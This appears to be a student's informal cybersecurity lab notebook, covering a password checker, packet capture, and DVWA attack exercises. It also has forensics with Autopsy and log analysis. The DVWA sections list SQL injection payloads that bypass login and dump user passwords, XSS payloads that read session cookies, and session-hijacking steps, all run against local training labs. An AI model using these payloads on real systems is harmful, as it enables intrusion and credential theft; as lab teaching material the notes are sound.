//ex[2 
import string
password = input("Enter password: ")
conditions = 0
# Minimum 8 characters
if len(password) >= 8:
    conditions += 1
# At least one digit
if any(char.isdigit() for char in password):
    conditions += 1
# At least one uppercase letter
if any(char.isupper() for char in password):
    conditions += 1
# At least one lowercase letter
if any(char.islower() for char in password):
    conditions += 1
# At least one special character
if any(char in string.punctuation for char in password):
    conditions += 1
# Strength check
if conditions == 5:
    print("Password Strength: STRONG")
elif conditions >= 3:
    print("Password Strength: MEDIUM")
else:
    print("Password Strength: WEAK")



//
exp 3 traffic ansylsi wireshark

python3 -m http.server 8080 
sudo tcpdump -i any -w capture.pcap port 8080 
 Open Firefox in kali Linux and go to: 
http://localhost:8080 
Refresh the page to generate traffic. 
Go back to tcpdump terminal. 
Stop packet capturing by using Ctrl + C. 

in Kali, just double-click capture.pcap. 

n Wireshark filter bar, type: http.request.method == "GET" 
Press Enter. 
Now only important packets will show. 
Click on any one of the packet and the following data is displayed. 
Browser details such as OS, browser version, language, and visited URLs are visible.If a form is 
submitted, username and password can be seen in plain text.This proves HTTP is insecure.

//
week-4
sudo apt update 

sudo apt install dvwa –y     (or)   sudo apt  –y install dvwa 

sudo service apache2 start 

sudo service mysql start



Step 3: Configure DVWA 
Edit config file: 
sudo nano /etc/dvwa/config.inc.php 
Ensure: 
$_DVWA['db_password'] = ''; 
CTRL + O ,  eneter 
CTRL + X

(or)
Open browser:

http://127.0.0.1/dvwa/setup.php

Then click:

Create / Reset Database
(Or)

Open DVWA in Browser(Firefox) 
http://127.0.0.1/dvwa 
 Login: 
o Username: admin 
o Password: password 
 Click Create / Reset Database



{OR]
docker run --rm -it -p 8080:80 vulnerables/web-dvwa
Wait 1–2 mins till container fully starts.

http://127.0.0.1:8080                                                       (or)              http://localhost:8080
admin
password

tep 8: Authentication Bypass 
Enter: 
1' OR '1'='1  

6. SQL Injection – Database Enumeration 
Step 9: Find Number of Columns 
1' ORDER BY 1-- - 
1' ORDER BY 2-- - 
1' ORDER BY 3-- - 
Stop when error occurs    Last successful number = total columns

Step 10: UNION-Based Injection 
1' UNION SELECT 1,2-- - 

Step 11: Extract Database Name 
1' UNION SELECT database(),2-- - 


Step 12: Extract Table Names 
1' UNION SELECT table_name,2  
FROM information_schema.tables  
WHERE table_schema=database()-- - 


Step 13: Extract Column Names 
1' UNION SELECT column_name,2  
FROM information_schema.columns  
WHERE table_name='users'-- - 


Step 14: Extract Username & Password 
1' UNION SELECT user,password FROM users-- - 

exp5 ?/
 Finding & Exploiting XSS Vulnerabilities using DVWA on Kali Linux

 Go to: 
DVWA → XSS (Reflected) 

In the input box, type: 
<script>alert('XSS')</script> 
Click Submit. 


Step 4: Stored XSS Test 
Go to: 
DVWA → XSS (Stored) 
Fill the form: 
Name: 
<h1>Hacked</h1> 
Message: 
<script>alert('Stored XSS')</script> 
Click Sign Guestbook. 


INn the URL bar add: 
#<script>alert('DOM XSS')</script> 
Press Enter → popup appears. 

Step 6: Capture Cookie (Lab Demo) 
In Stored XSS Message box: 
<script>alert(document.cookie)</script> 
This shows session cookies (demo of session theft). 

Step 7: Change Security Level 
Go to DVWA Security → set: 
 Medium 
 High 
Repeat the same payloads → see how filtering blocks them. 


// 
exp6
Open Firefox and enter: 
http://127.0.0.1/dvwa 
Step 3: Login to DVWA 
Use default credentials: 
Username: admin   
Password: password 
Step 4: Set Security Level 
 Go to DVWA Security 
 Select LOW 
 Click Submit 
 
PART B: Testing Authentication Weaknesses 
Experiment 1: Weak Password Authentication 
Step 1: Open Brute Force Module 
Navigate to: 
DVWA → Vulnerabilities → Brute Force 
 
 
Step 2: Try Common Passwords 
Enter: 
Username: admin 
Password: password 
Observation 
Successful login indicates weak authentication. 
Experiment 2: Manual Brute Force Attack 
Enter Username (Same Every Time) 
In Username field, type: 
admin 
Do NOT change username. 
Step 3: Try Passwords ONE BY ONE 
Now you will manually try passwords (this is the “manual brute force”). 
Attempt 1 
 Username: admin 
 Password: admin 
 Click Login 
❌ If it fails → try next password 
 
 
 Attempt 2 
 Username: admin 
 Password: 123456 
 Click Login 
❌ If it fails → try next password 
 
 
Attempt 3 
 Username: admin 
 Password: password 
 Click Login 
LOGIN SUCCESSFUL 
Step 4: Observe What Happened 
 DVWA did NOT block you 
 DVWA did NOT lock account 
 DVWA allowed unlimited attempts 
This is called Brute Force Vulnerability 
PART C: Testing Session Management Vulnerabilities 
✅ Experiment 3: Session ID Analysis 
Step 1: Login to DVWA 
Open browser developer tools: 
Right Click → Inspect → Storage → Cookies 
Step 2: Observe Session Cookie 
Look for: 
PHPSESSID 
Observation 
Session ID is visible and not encrypted. 
PHPSESSID : 5f6194766020dcaa2c906358cbd2941b 
Experiment 4: Session Hijacking 
BEFORE YOU START (IMPORTANT) 
DVWA security level = LOW 
You are logged in as admin in DVWA 
STEP-BY-STEP  
Step 1: Open DVWA (Victim Session) 
1. Open Firefox 
2. Go to: http://127.0.0.1/dvwa 
3. Login: 
Username: admin 
Password: password 
4. Stay logged in (do NOT logout) 
This browser is the Victim 
Step 2: Copy the Session ID (PHPSESSID) 
1. In the same Firefox window 
2. Right click → Inspect 
3. Click Storage tab 
4. Click Cookies 
5. Select: http://127.0.0.1 
You will see something like: 
PHPSESSID   a8c9f7e3d4b1... 
6. Right-click on PHPSESSID value → Copy 
This value is the session ID (user identity). 
Step 3: Open Attacker Browser (Private Window) 
1. Press: 
Ctrl + Shift + P 
(Private Window opens) 
Do NOT login here. 
Step 4: Paste Session ID in Attacker Browser 
1. In Private Window, go to: http://127.0.0.1/dvwa 
2. Right click → Inspect 
3. Go to Storage → Cookies 
4. Click: http://127.0.0.1 
5. Find PHPSESSID 
6. Replace its value with the copied PHPSESSID (5f6194766020dcaa2c906358cbd2941b) 
7. Press Enter 
Step 5: Refresh Page 
1. Refresh the page (F5) 
You are logged in as admin without username or password! 
Result 
Attacker gains access without login → Session Hijacking. 
Experiment 5: Session Fixation 
IMPORTANT CONDITIONS (CHECK FIRST) 
DVWA Security Level = LOW 
Use only ONE browser window (normal window) 
Do NOT use Private Window here 
STEP-BY-STEP (DO EXACTLY THIS) 
Step 1: Open DVWA WITHOUT Login (Attacker sets session) 
1. Open Firefox 
2. Go to: http://127.0.0.1/dvwa/ 
You will see the login page 
Do NOT login 
Step 2: Note the Session ID (Before Login) 
1. Right click → Inspect 
2. Go to Storage 
3. Click Cookies 
4. Select: http://127.0.0.1 
You will see: 
PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
Step 3: Login WITHOUT Closing Browser 
Now, in the same browser window: 
1. Enter: 
Username: admin 
Password: password 
2. Click Login 
Do NOT refresh, do NOT close browser 
Step 4: Check Session ID AGAIN (After Login) 
1. Again open: 
Inspect → Storage → Cookies → http://127.0.0.1 
2. Look at PHPSESSID 
3.  
OBSERVE CAREFULLY 
Case 1 (VULNERABLE – DVWA LOW) 
Before Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b 
After Login  PHPSESSID = 5f6194766020dcaa2c906358cbd2941b 
Same value  
Session Fixation exists 
Case 2 (SECURE – DVWA HIGH / IMPOSSIBLE) 
Before Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b 
After Login  PHPSESSID = be2d584526b42fef6742d5cf95ce008f 
Session regenerated  
No session fixation 
Experiment 6:  
CONDITIONS (CHECK FIRST) 
DVWA Security Level = LOW 
You must know how to view cookies  
STEP-BY-STEP ( 
Step 1: Login Normally (Victim Session) 
1. Open Firefox 
2. Go to: http://127.0.0.1/dvwa/ 
3. Login: 
Username: admin 
Password: password 
Step 2: Copy Session ID (IMPORTANT) 
1. Right click → Inspect 
2. Storage → Cookies → http://127.0.0.1 
3. Copy: 
PHPSESSID = be2d584526b42fef6742d5cf95ce008f 
Screenshot 1: PHPSESSID before logout 
Step 3: Logout from DVWA 
1. Click Logout (top right or menu) 
2. You will see login page 
Logout completed 
Step 4: Reuse OLD Session ID (THIS IS THE TEST) 
Option A (EASIEST & EXAM-SAFE) 
1. Open Private Window 
Ctrl + Shift + P 
2. Go to: 
http://127.0.0.1/dvwa/ 
3. Open Inspect → Storage → Cookies 
4. Paste the OLD PHPSESSID (copied earlier) 
5. Press Enter 
Step 5: Open Internal Page (KEY STEP 🔑) 
In address bar, type: 
http://127.0.0.1/dvwa/index.php 
(or) 
http://127.0.0.1/dvwa/vulnerabilities/brute/ 
�
� Do NOT press Login 
�
� Do NOT enter username/password 
�
� EXPECTED RESULT (DVWA LOW) 
✔ You are logged in again 
✔ Without login 
✔ Using old session ID 
Logout did NOT destroy session 
OBSERVATIONS & RESULTS 
Test Case 
Result 
Brute Force Attack 
Weak Password Login Successful 
Allowed 
Session ID Exposure 
Session Hijacking 
Found 
Possible 
Session Fixation 
Improper Logout 
Observed 
Observed 




    //

iot devices nd security ports 

docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop 
docker ps -a
docker start juiceshop

4. If port error or broken container → remove and recreate

Stop:

docker stop juiceshop

Remove:

docker rm juiceshop

Then run again:

docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop

Useful commands:

Running containers:
docker ps
Logs:
docker logs juiceshop
Restart:
docker restart juiceshop
 Deployment of simulated IoT device using Docker 
The application was accessed at: 
http://localhost:8090 

now type ipconfig            in cmd copy that IPV4 address


open kali linux terminal
nmap -sV {your ip address]


eg:   nmap -sV    192.168.0.148             (wait for 1-4 mins)
It showing service fingerprint / version detection 


The simulated IoT device dashboard was accessed through the browser using: 
http://localhost:8090 

Step 6: Testing Default/Weak Credentials 
The login functionality was tested using administrator credentials to check for default password 
vulnerability 

rightlcick->netework gtab-> finish
Step 7: Developer Tools → Network Tab 
• Network tab showing HTTP requests 
• Plain text traffic visible 


//
Creating and Analyzing Disk Images Using dc3dd and Autopsy (Alternative to FTK Imager)

echo "Cybersecurity Lab Evidence" > evidence.txt


cat   evidence.txt
ls
lsblk

Example output:
sda
 ├─sda1
 ├─sda2
The partition /dev/sda1 will be used for disk imaging

# Install dc3dd
sudo apt install dc3dd

# Show dc3dd help
dc3dd --help

# Create 100MB disk file
dd if=/dev/zero of=practice_disk.dd bs=1M count=100

# Create ext4 filesystem on disk image
mkfs.ext4 practice_disk.dd

# Verify image file
ls -lh /home/kali/disk_image.dd

# View acquisition log
cat /home/kali/acquisition.log

# Start Autopsy
autopsy
{or} if it doesnt work go for 
# Start Autopsy with sudo
sudo autopsy and eneter password kmit

The terminal will display a URL:
http://localhost:9999/autopsy
Open this link in the browser.

Step 7: Create a New Case
In the Autopsy interface:
1.	Click Create New Case
2.	Enter case details:

 
Step 8: Add Disk Image
Select:
Add Host → Add Image
Browse and select:
/home/kali/disk_image.dd
Autopsy will begin analyzing the disk image.
Host Name
KaliLabMachine
Description
Kali Linux virtual machine used for forensic disk image investigation
Time Zone
Leave Blank
Time Skew Adjustment
Leave Blank
Alert Hash Database
Leave Blank
Ignore Hash Database
Leave Blank
Then click:
Next
Step 9: Analyze Evidence

// log file analayis using incident dectection nd response
Understanding Log Files 
Navigate to Log Directory 
cd /var/log 
ls 

last 
journalctl | less 
Capture: 
 Logs output  
Failed SSH Attempts 
Command: 
journalctl | grep "Failed" 
SSH Login Activity 
Command: 
journalctl | grep ssh 
Error Detection 
Command: journalctl | grep -i error 
Apache Log Analysis 
Command: 
cd /var/log/apache2 
ls 
Then: 
sudo less access.log 
Apache logs record web requests. These logs help identify suspicious web activity such as 
repeated requests or attacks. 
Suspicious Requests 
Command: 
grep "404" /var/log/apache2/access.log 
This  shows failed web requests (404 errors), which may indicate scanning or probing attacks. 
Command: 
less /var/log/dpkg.log 
This  shows software installation and update logs, useful for detecting unauthorized changes. 
Real-Time Monitoring 
Command: 
sudo journalctl -f 


//////////optional 
kali : COMMAND=/usr/bin/less access.log 
kali : COMMAND=/usr/bin/journalctl -f 
✔ This is YOU running commands 
✔ Not suspicious 
Sudo activity corresponds to legitimate administrative actions performed by the user. 

//////////optional 



METHOD 1: SIMULATE FAILED SSH LOGIN   

Step 1: Ensure SSH is Installed 
sudo apt install openssh-server –y 
Step 2: Start SSH Service 
sudo service ssh start 
Step 3: Find Your IP Address 
ip a 
Look for something like: 
inet 192.168.x.x 
 
 
 Step 4: Attempt Wrong Login (GENERATE FAILURES) 
run: 
ssh fakeuser@localhost 
OR 
ssh kali@localhost 
Enter wrong password multiple times (5–10 times) 
 
Now Analyze Logs 
Step 5: Check Failed Logins 
journalctl | grep "Failed password" 
�
� You should now see: 
Failed password for kali from 127.0.0.1 port ... 
Step 6: Extract Suspicious IP 
journalctl | grep "Failed password" | awk '{print $11}' 
Output: 
127.0.0.1 
Step 7: Count Attempts Per IP 
journalctl | grep "Failed password" | awk '{print $11}' | sort 
| uniq -c | sort -nr 
Example: 
10 127.0.0.1 
INTERPRETATION (VERY IMPORTANT) 
Multiple failed login attempts were detected from IP address 127.0.0.1, indicating a simulated 
brute force attack. 
METHOD 2: Use lastb (Alternative) 
sudo lastb 
Shows failed login records 
HOW TO IDENTIFY “SUSPICIOUS IP” 
Simple rule: 
Condition 
Meaning 
Same IP repeated many times 🚨 Suspicious 
Unknown IP 
�
� Suspicious 
High frequency attempts 
�
� Brute force 
Run: 
journalctl --since "10 minutes ago" 
Shows recent attack activity



// 
//  NETWORK FORENSICS USING WIRESHARK

Step1:Open kali linux terminal 
Type wireshark &   Select eth0 
Apply filter as tcp…now you can able to see the only tcp packets. You can also try with 
UDP,HTTP in search bar
ip.addr == 192.168.0.161 → filters packets of a specific IP  

Ip.src==<IP_Address> like  
Ip.src== 192.168.0.161 
Right click on any TCP packet->Follow->TCP Stream
//Observation on above tcp stream: 
  
Complete conversation between two devices over TCP 
Red text → Data sent from one device  
  
Blue text → Data sent from the other device  
It reconstructs the entire communication stream 

Step 7: Identifying Suspicious Traffic 
Open kali linux terminal  
Type nmap –sS <target_IP>  
Eg:   nmap –sS 192.168.0.156   (use your windows ip) 
Open wireshark 
Use this filter: 
tcp.flags.syn == 1 && tcp.flags.ack == 0
In wireshark 
Go to Statistics->Capture File Properties 
In wireshark  Go To 
Statistics->Resolved Address 
Resolve Address in Wireshark converts numerical network addresses (like IP or MAC) into human
readable names such as domain names or device names.

Step 10: Go to  
Statistics-> Protocol Hierarchy Statistics  
Protocol Hierarchy Statistics shows the breakdown of all network protocols in the captured 
traffic in a hierarchical (layer-wise) format along with their percentage and packet count. 

Step 11: Go to 
Statistics->Conversations 
Conversations in Wireshark shows communication between two endpoints (devices), including 
source and destination addresses, number of packets, and data transferred. 

Step 12: 
Statistics-> Packet Length 
Packet Length refers to the size of a network packet measured in bytes, as captured by Wireshark. 

Step 13: 
Statistics-> End Points 
Endpoints in Wireshark represent individual network devices (hosts) involved in communication. It 
shows each device separately along with the number of packets sent/received and data usage. 
Step 14:  
Statistics-> I/O Graphs 
I/O Graphs (Input/Output Graphs) in Wireshark are used to display network traffic over time in the 
form of a graph, showing the number of packets or bytes captured per second. 




//   
wtsapp nd pther data breacgh anyalsis

sudo apt update

sudo apt install -y nodejs npm             (frm both the ocmmands check which eworks)

sudo apt install nodejs npm -y 
(or) 

sudo npm install -g nativefier
nativefier https://web.whatsapp.com
cd WhatsappWeb-linux-x64

ls
./WhatsAppWeb

open broswer in kali and 
https://reports.exodus-privacy.eu.org

or )///

# Install nodejs and npm
sudo apt install -y nodejs npm

# Run WhatsApp desktop
whatsapp-for-linux

# Open Exodus privacy audit website
https://reports.exodus-privacy.eu.org/

# Start Wireshark
wireshark

# Capture packets

# Open Facebook
https://www.facebook.com

# Open Burp Suite
burpsuite

# Check email breach
https://haveibeenpwned.com


//windows R 
enter 
type     msinfo32 - os version,tyope
settings-windows update->
settings-?windows defender firewall_>advanced settings
windowss ecurity->virus nd threat protection scan if any !

home->account->
home->apps nd featuires
network->network nd internet
browser->privacy nd seciuttuy
settings-?filesbackup

